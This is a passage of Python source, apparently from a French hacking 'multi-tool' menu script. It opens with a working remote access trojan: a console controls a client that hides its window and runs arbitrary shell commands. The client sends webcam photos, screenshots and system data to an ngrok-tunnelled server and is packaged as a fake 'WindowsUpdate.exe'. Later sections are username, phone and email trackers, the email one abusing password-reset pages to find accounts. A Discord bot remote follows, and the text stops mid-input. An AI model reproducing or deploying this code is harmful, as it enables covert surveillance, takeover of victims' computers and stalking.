                    continue
                
                if user_input.lower() == 'clients':
                    if active_clients:
                        print("\n Clients connectés:")
                        for i, cid in enumerate(active_clients, 1):
                            marker = "" if cid == current_client else "  "
                            print(f"{marker} {i}. {cid}")
                    else:
                        print(" Aucun client connecté")
                    continue
                
                if user_input.lower().startswith('select '):
                    client_id = user_input[7:].strip()
                    if client_id in active_clients:
                        current_client = client_id
                        print(f"✅ Client sélectionné: {current_client}")
                    else:
                        print(f" Client '{client_id}' non trouvé")
                    continue
                
                if user_input.lower() == 'help':
                    print("\n💻 Commandes disponibles:")
                    print("   • clients         : Liste des clients")
                    print("   • select <id>     : Sélectionner un client")
                    print("   • cmd <commande>  : Exécuter une commande shell")
                    print("   • sysinfo         : Informations système")
                    print("   • processes       : Liste des processus")
                    print("   • webcam          : Prendre une photo webcam")
                    print("   • screen          : Prendre un screenshot")
                    print("   • disconnect      : Déconnecter le client actuel")
                    print("   • help            : Afficher cette aide")
                    continue
                
                if user_input.lower() == 'disconnect':
                    if current_client:
                        command_queue[current_client]["command"] = "exit"
                        command_queue[current_client]["executed"] = False
                        print(f" Déconnexion de {current_client}")
                        current_client = None
                    continue
                
                if not current_client:
                    print(" Sélectionne d'abord un client avec 'select <id>'")
                    continue
                
                
                command_queue[current_client]["command"] = user_input
                command_queue[current_client]["executed"] = False
                results_queue[current_client]["retrieved"] = True
                
                print(" Commande envoyée, en attente du résultat...")
                
                
                timeout = 30
                start_time = time.time()
                while time.time() - start_time < timeout:
                    if not results_queue[current_client]["retrieved"]:
                        result = results_queue[current_client]["result"]
                        results_queue[current_client]["retrieved"] = True
                        
                        if "file" in results_queue[current_client]:
                            filename = results_queue[current_client]["file"]
                            print(f"\n{result}")
                            print(f" Voir à: {flask_url}/view/{filename}\n")
                        else:
                            print(f"\n Résultat:\n{result}\n")
                        break
                    time.sleep(0.5)
                else:
                    print("  Timeout - pas de réponse du client")
                
            except KeyboardInterrupt:
                print("\n\n  Arrêt...")
                break
            except Exception as e:
                print(f" Erreur: {e}")

    def install_dependencies():
        print("\n Vérification des dépendances...")
        
        dependencies = ['pyngrok', 'flask', 'pyinstaller', 'requests']
        
        for dep in dependencies:
            try:
                __import__(dep)
                print(f"✅ {dep} déjà installé")
            except ImportError:
                print(f"✅ Installation de {dep}...")
                subprocess.check_call([sys.executable, "-m", "pip", "install", dep, "-q"])
                print(f"✅ {dep} installé avec succès")

    def create_client_file(server_url):        
        client_code = f'''import requests
import subprocess
import os
import time
import sys
import base64
import platform
import uuid

SERVER_URL = "{server_url}"
CLIENT_ID = f"{{platform.node()}}_{{str(uuid.uuid4())[:8]}}"

def take_webcam_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            filename = "temp_webcam.jpg"
            cv2.imwrite(filename, frame)
            cap.release()
            return filename
        cap.release()
    except:
        pass
    return None

def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        filename = "temp_screen.jpg"
        screenshot.save(filename, 'JPEG')
        return filename
    except:
        pass
    return None

def get_system_info():
    try:
        info = f"System: {{platform.system()}}\\n"
        info += f"Node: {{platform.node()}}\\n"
        info += f"Release: {{platform.release()}}\\n"
        info += f"Version: {{platform.version()}}\\n"
        info += f"Machine: {{platform.machine()}}\\n"
        info += f"Processor: {{platform.processor()}}"
        return info
    except:
        return "Unable to get system info"

def list_processes():
    try:
        if os.name == 'nt':
            output = subprocess.check_output("tasklist", shell=True)
            return output.decode('cp1252', errors='ignore')
        else:
            output = subprocess.check_output("ps aux", shell=True)
            return output.decode('utf-8', errors='ignore')
    except:
        return "Failed to list processes"

def register():
    try:
        info = get_system_info()
        response = requests.post(
            f"{{SERVER_URL}}/register",
            json={{"client_id": CLIENT_ID, "info": info}},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False

def get_command():
    try:
        response = requests.post(
            f"{{SERVER_URL}}/get_command",
            json={{"client_id": CLIENT_ID}},
            timeout=10
        )
        data = response.json()
        return data.get("command")
    except:
        return None

def send_result(result, result_type="text"):
    try:
        requests.post(
            f"{{SERVER_URL}}/send_result",
            json={{
                "client_id": CLIENT_ID,
                "result": result,
                "type": result_type
            }},
            timeout=30
        )
    except:
        pass

def execute_command(command):
    if command == "exit":
        return None
    
    if command == "webcam":
        filename = take_webcam_photo()
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            send_result(encoded, "file")
            os.remove(filename)
        else:
            send_result("Error: Unable to capture webcam")
    
    elif command == "screen":
        filename = take_screenshot()
        if filename and os.path.exists(filename):
            with open(filename, 'rb') as f:
                data = f.read()
            encoded = base64.b64encode(data).decode('utf-8')
            send_result(encoded, "file")
            os.remove(filename)
        else:
            send_result("Error: Unable to capture screen")
    
    elif command.startswith("cmd "):
        cmd = command[4:]
        try:
            if sys.platform == 'win32':
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('cp1252', errors='ignore')
            else:
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                output = output.decode('utf-8', errors='ignore')
            send_result(output)
        except Exception as e:
            send_result(f"Error: {{str(e)}}")
    
    elif command == "sysinfo":
        info = get_system_info()
        send_result(info)
    
    elif command == "processes":
        processes = list_processes()
        send_result(processes)
    
    else:
        send_result("Unknown command")

def main():
    # S'enregistrer auprès du serveur
    while not register():
        time.sleep(5)
    
    # Boucle principale
    while True:
        try:
            command = get_command()
            
            if command:
                if command == "exit":
                    break
                execute_command(command)
            
            time.sleep(2)
            
        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    # Masquer la console sur Windows
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main()
    '''
        
        
        with open("client.py", "w", encoding='utf-8') as f:
            f.write(client_code)
        print(f"\n{'='*60}")
        print("✅ FICHIER CLIENT CRÉÉ: client.py")
        print(f"{'='*60}")
        print("\n🔨 Génération de l'exécutable...")
        try:
            result = subprocess.run([
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--name=WindowsUpdate",
                "client.py"
            ], capture_output=True, text=True)
            
            exe_path = os.path.join("dist", "WindowsUpdate.exe")
            if os.path.exists(exe_path):
                print(f"✅ EXE créé avec succès: {exe_path}")
                print(f"\n{'='*60}")
                print(f" Serveur: {server_url}")
                print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
                print(f"{'='*60}\n")
            else:
                print(" EXE non trouvé dans dist/")
        except Exception as e:
            print(f" Erreur lors de la création de l'EXE: {e}")

    def setup_ngrok(ngrok_token):
        try:
            from pyngrok import ngrok
            from pyngrok.installer import install_ngrok
            from pyngrok.conf import PyngrokConfig
            import logging

            logging.getLogger('pyngrok').setLevel(logging.ERROR)
            
            print(" Configuration de ngrok...")
            
            pyngrok_config = PyngrokConfig()
            ngrok_path = install_ngrok(pyngrok_config.ngrok_path)
            print(f"✅ Ngrok installé: {ngrok_path}")
            
            pyngrok_config = PyngrokConfig(ngrok_path=ngrok_path, log_event_callback=lambda log: None)
            ngrok.set_auth_token(ngrok_token, pyngrok_config)
            print("✅ Token ngrok configuré")
            
            return pyngrok_config
            
        except Exception as e:
            print(f" Erreur configuration ngrok: {e}")
            return None

    def main():
        print("\n" + "="*60)
        print("      MINI RAT ^^     ")
        print("="*60 + "\n")

        import logging
        logging.getLogger('pyngrok').setLevel(logging.CRITICAL)
        logging.getLogger('werkzeug').setLevel(logging.ERROR)

        install_dependencies()
        
        from pyngrok import ngrok

        ngrok_token = input("\n Token ngrok : ").strip()
        if not ngrok_token:
            print("Token ngrok requis!")
            return
        
        pyngrok_config = setup_ngrok(ngrok_token)
        if not pyngrok_config:
            return

        port = int(input("Port Flask [5000]: ") or "5000")

        print("\n Démarrage de Flask...")
        flask_thread = threading.Thread(target=start_flask, args=(port,))
        flask_thread.daemon = True
        flask_thread.start()
        time.sleep(2)

        print(" Création du tunnel HTTP...")
        try:
            tunnel = ngrok.connect(port, "http", pyngrok_config=pyngrok_config)
            public_url = tunnel.public_url

            print("\n" + "="*60)
            print("✅ TUNNEL HTTP NGROK CRÉÉ!")
            print("="*60)
            print(f" URL publique: {public_url}")
            print("="*60 + "\n")

            create_client_file(public_url)

            print("\n✅ Serveur prêt! Les clients vont se connecter automatiquement...")
            print(f" URL du serveur: {public_url}")
            print(f" Fichier à distribuer: dist/WindowsUpdate.exe")
            print(" Appuie sur Ctrl+C pour arrêter\n")
            
            time.sleep(2)
            
          
            command_interface(public_url)

        except Exception as e:
            print(f" Erreur ngrok: {e}")
            import traceback
            traceback.print_exc()
            return

    if __name__ == "__main__":
        try:
            main()
        except KeyboardInterrupt:
            print("\n\n  Arrêt du serveur...")
            sys.exit(0)
        except Exception as e:
            print(f"\n Erreur: {e}")
            import traceback
            traceback.print_exc()
            sys.exit(1)


if menu_choice == "7":
            os.system('cls' if os.name == 'nt' else 'clear')
            efcm = """
             .....................           
          :*########************+++=.        ╔╗ ╔╗                                ╔╗             ╔╗
        .-#############***********+++.       ║║ ║║                               ╔╝╚╗            ║║
        .-%#:.....................-+*:       ║║ ║║╔══╗╔══╗╔═╗╔═╗ ╔══╗ ╔╗╔╗╔══╗   ╚╗╔╝╔═╗╔══╗ ╔══╗║║╔╗╔══╗╔═╗
        .-%*.                     :+*:       ║║ ║║║══╣║╔╗║║╔╝║╔╗╗╚ ╗║ ║╚╝║║╔╗║    ║║ ║╔╝╚ ╗║ ║╔═╝║╚╝╝║╔╗║║╔╝
        .-%*.                     :+*:       ║╚═╝║╠══║║║═╣║║ ║║║║║╚╝╚╗║║║║║║═╣    ║╚╗║║ ║╚╝╚╗║╚═╗║╔╗╗║║═╣║║
      .-=-:-.   .::-======--:..   .:::::.    ╚═══╝╚══╝╚══╝╚╝ ╚╝╚╝╚═══╝╚╩╩╝╚══╝    ╚═╝╚╝ ╚═══╝╚══╝╚╝╚╝╚══╝╚╝ 
     .%%%%#. .:+#%##########***=.. :+**+=.   
    .=%%%%%+.+%%%%%%%##########**-.=*****:.                 Username Tracker By AltWolf
   .%%%%%%%*=%%%%%%%%%%%##########-+******=                         Version free
   .%%%%%%%+#%%%%%%%%%############=+******=. 
    .-+=:..:+%#%#+---+%%#+---+##*#-...:--:.  
            :#%*.    -#%*:    .+#+.               
            .-%*.  .=#%%%#-.  .*#-                        
    .-=-:..::*%%%##%%%%#%%%%**%%%+:...:--:.  
   .%%%%%%%#=%%%%%%%%%+.+%%%%%%%%%-*%%%%%%+. 
   .%%%%%%%%=#%%%%%%%%#*#%%%%%%%%++%%%%%%%+. 
    .+%%%%%*....:=%%%%%%%%%%#-... .*%%%%%-.  
     :%@%%%:     -%%%%%%%%%%*:     -%%%%#.   
      :+*+:-.    .:-+*#***=-.     :::=+=.    
        .=%%.                     :%%:.      
        .+@%.                     :%%-       
        .+@%:.....................=%%-       
        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       
        .+@@@@@@@@@@@%%%%%%%%%%%%%%%%-       
        .=@@@@@@@@@%%%%%%%%%%%%%%%%%%:       
         .=@@@@@@@@@@@@@@@@@@@@%%%%#-. 
            """
            print_violet_white_gradient(efcm)
            def search_username(username):
                profiles = {}
                social_media = {
                    "Instagram": f"https://www.instagram.com/{username}",
                    "Twitter": f"https://twitter.com/{username}",
                    "TikTok": f"https://www.tiktok.com/@{username}",
                    "YouTube": f"https://www.youtube.com/@{username}",
                    "Facebook": f"https://www.facebook.com/{username}",
                    "Twitch": f"https://www.twitch.tv/{username}",
                    "Snapchat": f"https://www.snapchat.com/add/{username}",
                    "Discord": f"https://discord.com/users/{username}",
                    "Steam": f"https://steamcommunity.com/id/{username}",
                    "Xbox Live": f"https://account.xbox.com/en-US/Profile?GamerTag={username}",
                    "PlayStation": f"https://psnprofiles.com/{username}",
                    "Reddit": f"https://www.reddit.com/user/{username}",
                    "LinkedIn": f"https://www.linkedin.com/in/{username}",
                    "GitHub": f"https://github.com/{username}",
                    "Pinterest": f"https://www.pinterest.com/{username}",
                    "Telegram": f"https://t.me/{username}",
                    "Tumblr": f"https://{username}.tumblr.com",
                    "Spotify": f"https://open.spotify.com/user/{username}",
                    "SoundCloud": f"https://soundcloud.com/{username}",
                    "Medium": f"https://medium.com/@{username}",
                    "Patreon": f"https://www.patreon.com/{username}",
                    "Roblox": f"https://www.roblox.com/users/profile?username={username}",
                    "Fortnite": f"https://fortnitetracker.com/profile/all/{username}",
                    "Vimeo": f"https://vimeo.com/{username}",
                    "Flickr": f"https://www.flickr.com/people/{username}",
                    "DeviantArt": f"https://www.deviantart.com/{username}",
                    "Dribbble": f"https://dribbble.com/{username}",
                    "Behance": f"https://www.behance.net/{username}",
                    "Keybase": f"https://keybase.io/{username}",
                    "HackerOne": f"https://hackerone.com/{username}",
                    "Codecademy": f"https://www.codecademy.com/profiles/{username}",
                    "About.me": f"https://about.me/{username}",
                    "Badoo": f"https://badoo.com/@{username}",
                    "Meetup": f"https://www.meetup.com/members/{username}",
                    "Slack": f"https://{username}.slack.com",
                    "Blogger": f"https://{username}.blogspot.com"
                }

                print(f"Searching for username: {username}")
                print("This may take a moment...\n")

                for platform, url in social_media.items():
                    try:
                        response = requests.get(url, timeout=5)
                        if response.status_code == 200:
                            profiles[platform] = url
                            print(f"[+] Found: {platform}")
                    except:
                        pass

                return profiles

            def display_results(profiles):
                print("\n" + "="*50)
                if not profiles:
                    print("No profiles found.")
                else:
                    print(f"Found {len(profiles)} profile(s):\n")
                    for platform, url in profiles.items():
                        print(f"    {platform}: {url}")
                print("="*50)

            if __name__ == "__main__":
                username = input("Enter username to search: ")
                profiles = search_username(username)
                display_results(profiles)
                
                input("\nPress enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

elif menu_choice == "8":
            os.system('cls' if os.name == 'nt' else 'clear')
            phh = """
              ..-:.....                      
               .%@@@@%=...                    
                ...-#@@@#:...                 
             ..-=-:...:*@@+..                 
        ..::..:*%@@%+:..-%@*..                
      ...*@@*.....:*@@:..=@@-.                
     ..=@%%@@#:. ...+@@. :#@%.                
   ..-@@@@@*@@@=.. .-%@= .*@%.                
   .*@@@@@@@%#@@#....=*. .:=..                
  .-%@@@@@@@@%#%@@+.                          
   .*@@@@@@@@@@+%@%=..                        
  ...*@@@@@@@@@@*...                       Phone Tracker By AltWolf
     .=%@@@@@@@=..                             Version Free
     ..:#@@@@@@@+.                            
      ...=@@@@@@@%..                          
         ..*@@@@@@@*...      ...              
           .:#@@@@@@@*:... ..*%+:...          
           ...-#@@@@@@@%+:.+#*%@@%+....       
            ....:@@@@@@@@@@@@@@##@@@%=...     
               ...-%@@@@@@@@@@@@@@*%@@@#:..   
                 ...-#@@@@@@@@@@@@@@%#%@*..   
                  ....:*@@@@@@@@@@@@@@#-..    
                     ....-%@@@@@@@@@@+..      
                         ...=%@@@@@#:..       
                           ..........      
            """
            print_violet_white_gradient(phh)
            def check_online_accounts(phone_number):
                accounts = {}
                clean_number = phone_number.replace('+', '').replace(' ', '').replace('-', '')
                
                services = {
                    "WhatsApp": f"https://wa.me/{clean_number}",
                    "Telegram": f"https://t.me/{clean_number}",
                    "Viber": f"viber://add?number={clean_number}",
                    "Line": f"https://line.me/ti/p/~{clean_number}",
                    "WeChat": f"weixin://dl/chat?{clean_number}",
                    "KakaoTalk": f"https://open.kakao.com/o/{clean_number}",
                    "Skype": f"skype:{clean_number}?call",
                    "Discord": f"https://discord.com/users/{clean_number}",
                    "IMO": f"https://imo.im/{clean_number}"
                }
                
                print("\nChecking online accounts...")
                
                for service, url in services.items():
                    try:
                        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                        response = requests.get(url, timeout=3, allow_redirects=True, headers=headers)
                        if response.status_code == 200:
                            accounts[service] = url
                            print(f"[+] {service}: Possible account")
                    except:
                        pass
                
                return accounts

            def print_info(phone_number, formatted_number, status, country_code, country, region, timezone_info, operator, type_number, accounts):
                print(f"""
                Phone        : {phone_number}
                Formatted    : {formatted_number}
                Status       : {status}
                Country Code : {country_code}
                Country      : {country}
                Region       : {region}
                Timezone     : {timezone_info}
                Operator     : {operator}
                Type Number  : {type_number}
                """)
                
                if accounts:
                    print("Possible online accounts:")
                    for service, url in accounts.items():
                        print(f"    {service}: {url}")
                else:
                    print("No online accounts found automatically.")

            def main():
                print("Phone Number Lookup")

                try:
                    phone_number = input("Enter phone number (with country code e.g. +33123456789): ")
                    print("Retrieving information...")

                    parsed_number = phonenumbers.parse(phone_number, None)

                    if phonenumbers.is_valid_number(parsed_number):
                        status = "Valid"
                    else:
                        status = "Invalid"

                    if phone_number.startswith("+"):
                        country_code = "+" + phone_number[1:3]
                    else:
                        country_code = "Unknown"

                    try:
                        operator = carrier.name_for_number(parsed_number, "en")
                        if not operator:
                            operator = "Unknown"
                    except:
                        operator = "Unknown"

                    try:
                        number_type = phonenumbers.number_type(parsed_number)
                        if number_type == phonenumbers.PhoneNumberType.MOBILE:
                            type_number = "Mobile"
                        elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
                            type_number = "Fixed Line"
                        else:
                            type_number = "Other"
                    except:
                        type_number = "Unknown"

                    try:
                        timezones = timezone.time_zones_for_number(parsed_number)
                        timezone_info = timezones[0] if timezones else "Unknown"
                    except:
                        timezone_info = "Unknown"

                    try:
                        country = phonenumbers.region_code_for_number(parsed_number)
                        if not country:
                            country = "Unknown"
                    except:
                        country = "Unknown"

                    try:
                        region = geocoder.description_for_number(parsed_number, "en")
                        if not region:
                            region = "Unknown"
                    except:
                        region = "Unknown"

                    try:
                        formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
                    except:
                        formatted_number = phone_number

                    accounts = check_online_accounts(phone_number)
                    
                    print_info(phone_number, formatted_number, status, country_code, country, region, timezone_info, operator, type_number, accounts)
                    
                except phonenumbers.phonenumberutil.NumberParseException:
                    print("Invalid format! Please enter a valid phone number with country code.")
                except Exception as e:
                    print(f"An error occurred: {e}")

                input("Press enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

            if __name__ == "__main__":
                main()

elif menu_choice == "9":
            os.system('cls' if os.name == 'nt' else 'clear')
            typn = """
      ...                        ...      
   .-*****-                    .-----:.   
   .********+.              .==-------.   
   .********+++-.        .:+++=-------.   
   .********++++++:.   .=+++++=-------:   
   .+++*****++++++++=-++++++++=----=++:   Email Tracker By AltWolf
   .+++++***++++++++++++++++++=-=+++++:        Version Free
   .+++++++==+++++++++++++++++-+++++++:   
   .+++++++= .:++++++++++++-. -+++++++:   
   .+++++++=    .-+++++++..   -+++++++:   
   .+++++++=       .=+:.      -+++++++:   
   .+++++++=                  -+++++++:   
   .+++++++=                  -+++++++:   
   .+++++++=                  -+++++++. 
            """
            print_violet_white_gradient(typn)
            def check_email_exists(email):
                sites = {
                    "Facebook": "https://www.facebook.com/recover/initiate",
                    "Twitter": "https://twitter.com/account/begin_password_reset",
                    "Instagram": "https://www.instagram.com/accounts/password/reset/",
                    "Snapchat": "https://accounts.snapchat.com/accounts/password/reset",
                    "Pinterest": "https://www.pinterest.com/reset/",
                    "TikTok": "https://www.tiktok.com/login/forgot-password",
                    "Reddit": "https://www.reddit.com/password",
                    "Tumblr": "https://www.tumblr.com/login/forgot",
                    "YouTube": "https://www.youtube.com/account_recovery",
                    "GitHub": "https://github.com/password_reset",
                    "LinkedIn": "https://www.linkedin.com/uas/request-password-reset",
                    "Discord": "https://discord.com/api/v9/auth/forgot",
                    "Spotify": "https://accounts.spotify.com/en/password-reset",
                    "Netflix": "https://www.netflix.com/password",
                    "Amazon": "https://www.amazon.com/ap/forgotpassword",
                    "Microsoft": "https://account.live.com/password/reset",
                    "Apple": "https://iforgot.apple.com/password/verify/appleid",
                    "Dropbox": "https://www.dropbox.com/forgot",
                    "Twitch": "https://www.twitch.tv/user/password_reset",
                    "Steam": "https://store.steampowered.com/login/forgotpassword"
                }

                results = {}
                print(f"Checking email: {email}")
                print("This may take a moment...\n")

                for site_name, reset_url in sites.items():
                    try:
                        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                        payload = {'email': email}
                        response = requests.post(reset_url, data=payload, timeout=5, headers=headers, allow_redirects=True)

                        response_text = response.text.lower()
                        
                        if any(keyword in response_text for keyword in ['sent', 'email', 'recovery', 'reset', 'check your email', 'verify']):
                            results[site_name] = "Account found"
                            print(f"[+] {site_name}: Account found")
                        else:
                            results[site_name] = "Not found"

                    except requests.RequestException:
                        results[site_name] = "Could not check"
                    except:
                        pass

                return results

            email_to_check = input("Enter email address to check: ")
            results = check_email_exists(email_to_check)

            print("\n" + "="*50)
            print("Results:\n")
            for site, result in results.items():
                if result == "Account found":
                    print(f"    {site}: {result}")

            print("="*50)

            input("\nPress enter to continue...")
            time.sleep(1)
            os.system("python Alt-tool-Free.py")       

if menu_choice == "10":
            os.system('cls' if os.name == 'nt' else 'clear')
            bannerr = """
                                       
              :@@@@@@@@                
            *@@@@@@@@@@@@              
           @@@@@@@@@@@@@@@=            
          -@@@@@@@@@@@@@@@@            
          @@@@@@@@@@@@@@@@@.           
          +@@@@@@@@@@@@@@@@            ID Tracker by AltWolf
           @@@@@@@@@@@@@@@@                 Version Free
            @@@@@@@@@@@@@-             
              %@@@@@@@@-               
           %@-          %@-            
        .@@@@@@@@@@@@@@@@@@@@          
       @@@@@@@@@@@@@@@@@@@@@@@+        
      @@@@@@@@@@@@@@@@@@@@@@@@@@       
     @@@@@@@@@@@@@@@@@@@@@@@@@@@@      
    -@@@@@@@@@@@@@@@@@@@@@@@@@@@@      
    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@*     
    .----------------------------  

            """
            print_violet_white_gradient(bannerr)
            def check_url(url):
                try:
                    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                    response = requests.head(url, headers=headers, timeout=5, allow_redirects=True)
                    return response.status_code == 200
                except:
                    return None

            def search_id(user_id):
                platforms = {
                    'Twitter/X': 'https://twitter.com/{}',
                    'Instagram': 'https://www.instagram.com/{}',
                    'Facebook': 'https://www.facebook.com/{}',
                    'GitHub': 'https://github.com/{}',
                    'Reddit': 'https://www.reddit.com/user/{}',
                    'Discord': 'https://discord.com/users/{}',
                    'YouTube': 'https://www.youtube.com/@{}',
                    'TikTok': 'https://www.tiktok.com/@{}',
                    'Telegram': 'https://t.me/{}',
                    'Twitch': 'https://www.twitch.tv/{}',
                    'LinkedIn': 'https://www.linkedin.com/in/{}',
                    'Snapchat': 'https://www.snapchat.com/add/{}',
                    'Pinterest': 'https://www.pinterest.com/{}',
                    'Tumblr': 'https://{}.tumblr.com',
                    'Medium': 'https://medium.com/@{}',
                    'Pastebin': 'https://pastebin.com/u/{}',
                    'Spotify': 'https://open.spotify.com/user/{}',
                    'SoundCloud': 'https://soundcloud.com/{}',
                    'Steam': 'https://steamcommunity.com/id/{}',
                    'Roblox': 'https://www.roblox.com/users/profile?username={}',
                    'DeviantArt': 'https://www.deviantart.com/{}',
                    'Behance': 'https://www.behance.net/{}',
                    'Dribbble': 'https://dribbble.com/{}',
                    'Vimeo': 'https://vimeo.com/{}',
                    'Flickr': 'https://www.flickr.com/people/{}',
                    'Keybase': 'https://keybase.io/{}',
                    'GitLab': 'https://gitlab.com/{}',
                    'Bitbucket': 'https://bitbucket.org/{}',
                    'About.me': 'https://about.me/{}',
                    'Linktree': 'https://linktr.ee/{}',
                    'Codecademy': 'https://www.codecademy.com/profiles/{}',
                    'HackerOne': 'https://hackerone.com/{}',
                    'WordPress': 'https://{}.wordpress.com',
                    'Blogger': 'https://{}.blogspot.com',
                    'Goodreads': 'https://www.goodreads.com/{}',
                    'Last.fm': 'https://www.last.fm/user/{}',
                    'Mixcloud': 'https://www.mixcloud.com/{}',
                    'Bandcamp': 'https://{}.bandcamp.com'
                }

                print(f"\nSearching for ID: {user_id}")
                print("This may take a moment...\n")

                results = {'found': [], 'not_found': [], 'unknown': []}

                for platform, url_template in platforms.items():
                    url = url_template.format(quote(user_id))
                    
                    print(f"Checking {platform}...", end='\r', flush=True)

                    status = check_url(url)
                    
                    if status:
                        print(f"[+] {platform:<20} -> {url}")
                        results['found'].append((platform, url))
                    elif status is False:
                        results['not_found'].append(platform)
                    else:
                        results['unknown'].append((platform, url))

                    time.sleep(0.2)

                print_summary(results, user_id)

            def print_summary(results, user_id):
                print(f"\n{'='*60}")
                print(f"SEARCH SUMMARY FOR: {user_id}")
                print(f"{'='*60}\n")

                print(f"Profiles found: {len(results['found'])}")
                for platform, url in results['found']:
                    print(f"  - {platform}: {url}")

                print(f"\nProfiles not found: {len(results['not_found'])}")
                
                if results['unknown']:
                    print(f"\nManual verification required: {len(results['unknown'])}")
                    for platform, url in results['unknown']:
                        print(f"  - {platform}: {url}")

                print(f"\n{'='*60}\n")

            def main():
                print("ID TRACKER - Multi-Platform Search\n")
                
                user_id = input("Enter ID or username to search: ").strip()
                
                if not user_id:
                    print("Error: Empty ID")
                    return
                
                try:
                    search_id(user_id)
                except KeyboardInterrupt:
                    print("\n\nSearch interrupted by user")
                except Exception as e:
                    print(f"\nError: {str(e)}")

                input("Press enter to continue...")
                time.sleep(1)
                os.system("python Alt-tool-Free.py")

            if __name__ == "__main__":
                main()

elif menu_choice == "11":
        os.system('cls' if os.name == 'nt' else 'clear')
        time.sleep(0.5)
        control = """
      +%%%%%%:                       +%%%%%%:      
     *%%%%%%%%:                     *%%%%%%%%=     
   .+%%%%%%%%%#::::::::::::::::::::-%%%%%%%%%#-    
  *%%%%#**%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  +%%%%-  
 #%%%%%-  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%.  =%%%%%+ 
-%%%-..**#-..*%%%%%%%%%%%%%%%%%%%%%*. -%%%%%%: -%%.
*%%%:  ++*-  +%%%%+--+%%%%%%#=+%%%%=   %%%%%*  .#%:
#%%%%%%-  #%%%%%%%%%%%%%%%%%%%%%%%%%%%%%*.:#%%%%%%=
%%%%%%%*++%%%%%%%%%%%%%%%%%%%%%%%%%%%%%#   -%%%%%%+                  Controler de bot discord By AltWolf
%%%%%%%%%%%%%%=.  :*%%%%%%%%%%%-   :%%%%%##%%%%%%%#       When the script starts (purple and green as shown below)
%%%%%%%%%%%%%=      +%%%%%%%%%.      #%%%%%%%%%%%%%                    please press the Enter key ONCE!
%%%%%%%%%%%%%-      +%%%%%%%%%       #%%%%%%%%%%%%%
%%%%%%%%%%%%%%-    +%%:     -%%.   .#%%%%%%%%%%%%%%
%%%%%%%%%%%%-:#%%%%#-        .=%%%%%+:*%%%%%%%%%%%%
%%%%%%%%%%%=                           *%%%%%%%%%%%
%%%%%%%%%%-                             #%%%%%%%%%#
-%%%%%%%%-                               +%%%%%%%#.
  :+##*-                                   =##*=.  
        """
        print_violet_white_gradient(control)
        time.sleep(5)
        os.system('cls' if os.name == 'nt' else 'clear')
        intents = discord.Intents.default()
        intents.messages = True

        async def main(token, server_id, channel_id):
            client = discord.Client(intents=intents)
            
            @client.event
            async def on_ready():
                print(f'{Fore.LIGHTMAGENTA_EX}Connected : {client.user}')
                server = client.get_guild(int(server_id))
                if server is None:
                    print("Impossible to contact the server.")
                    return
                channel = server.get_channel(int(channel_id))
                if channel is None:
                    print("Impossible to contact the canal")
                    return
                while True:
                    commande = input(f'{Fore.LIGHTMAGENTA_EX}Enter a sentence or a command :{Fore.LIGHTGREEN_EX}')
                    if commande.lower() == "exit":
                        break
                    await channel.send(commande)
                    print(f"Command send : {commande}")

            await client.start(token)

        if __name__ == "__main__":
            ban = input(f""" {Fore.MAGENTA} 
            
                                                                
                @:                              :@               
               @@-@:   {Fore.LIGHTGREEN_EX}Remote-Token-Bot-Dc{Fore.MAGENTA}  :@-@@           
               @@%#@.                      .@#%@@             
               +@@*:@@#                  #@@:*@@+               
               #@@@:@@@                @@@:@@@#                                                                              
                @@@@##@@#:          :#@@##@@@@                                                                  
                 @@@@@@@@@@:      :@@@@@@@@@@                                                                
                  .@@@@@@@@@-    -@@@@@@@@@.                                                                     
                     @@@@@@@|    |@@@@@@@.                                                
                      @@@@@@#    #@@@@@@                 {Fore.LIGHTGREEN_EX}##########################################{Fore.LIGHTMAGENTA_EX}
                       @@@@@@    @@@@@@                  {Fore.LIGHTGREEN_EX}##                                      ##{Fore.LIGHTMAGENTA_EX}
                       @@@@@@    @@@@@@                  {Fore.LIGHTGREEN_EX}##   {Fore.LIGHTMAGENTA_EX}Mettre le token du bot a remote{Fore.LIGHTGREEN_EX}    ##{Fore.LIGHTMAGENTA_EX}
                       @@@@@@:  :@@@@@@                  {Fore.LIGHTGREEN_EX}##                                      ##{Fore.LIGHTMAGENTA_EX}
                      :@@@@@@+  +@@@@@@:                 {Fore.LIGHTGREEN_EX}##########################################{Fore.LIGHTMAGENTA_EX}        
                      *@@@@@@|  %@@@@@@*                                   |||
                      @@@@@@@@  @@@@@@@@                                   |||
                      @@@@@@@@  @@@@@@@@                                   |||
                     +@@@@@@@@..@@@@@@@@+                                   |
                     @@@@@@@@@==@@@@@@@@@                                   v
                    +@@@@@@@@@##@@@@@@@@@+     
                                """)  
            letoken = input(f"{Fore.LIGHTGREEN_EX}Token {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
            server_id = input(f"{Fore.LIGHTGREEN_EX}ID du serveur {Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTGREEN_EX} ")
